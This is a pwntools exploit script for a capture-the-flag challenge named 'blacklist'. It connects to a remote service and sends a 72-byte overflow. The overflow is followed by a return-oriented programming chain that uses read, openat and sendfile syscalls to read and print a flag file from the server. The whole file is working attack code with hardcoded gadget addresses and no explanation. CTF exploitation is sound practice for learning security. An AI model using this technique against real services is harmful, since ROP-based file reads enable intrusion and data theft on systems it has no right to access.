from pwn import *

#io = process("./blacklist")
#gdb.attach(io,"b*0x401dd3")

io = remote("blacklist.fword.wtf",1236)

syscall_ret = 0x0041a7f4
pop_rax = 0x0000000000401daf
pop_rdi = 0x00000000004017b6
pop_rsi = 0x00000000004024f6
pop_rdx = 0x0000000000401db2
pop_10 = 0x0000000000401db1

bss= 0x004b2000
flag = "/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00"

payload = "a"*72 + p64(pop_rax) + p64(0)
payload+= p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss)
payload+= p64(pop_rdx) + p64(len(flag)) + p64(syscall_ret)
payload+= p64(pop_rax) + p64(257) + p64(pop_rsi)+ p64(bss)
payload+= p64(pop_rdi) + p64(0) + p64(pop_rdx) + p64(0)
payload+= p64(pop_10) + p64(0644) + p64(syscall_ret)
payload+= p64(pop_rax) + p64(40)+p64(pop_rdi) + p64(1)
payload+= p64(pop_rsi) + p64(3)+ p64(pop_rdx) + p64(0)
payload+= p64(pop_10) + p64(500) + p64(syscall_ret)


io.sendline(payload)
io.sendline(flag)
io.interactive()
